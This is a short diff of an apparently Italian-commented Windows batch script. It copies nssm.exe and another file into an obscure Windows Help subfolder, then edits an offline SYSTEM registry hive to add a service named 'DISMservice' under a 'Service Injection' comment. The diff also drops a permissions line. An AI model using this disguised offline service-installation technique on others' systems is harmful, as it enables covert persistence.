@@ -45,10 +45,6 @@ copy 5633 "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
 copy nssm.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
 
 
-:: permessi SYS
-icacls "C:\WINDOWS\Help\mui\0563\DIAgnostic" /grant SYSTEM:F /T
-
-
 :: Service Injection
 reg load HKLM\zSYSTEM "!WINLETTER!\Windows\System32\Config\SYSTEM"
 reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /f
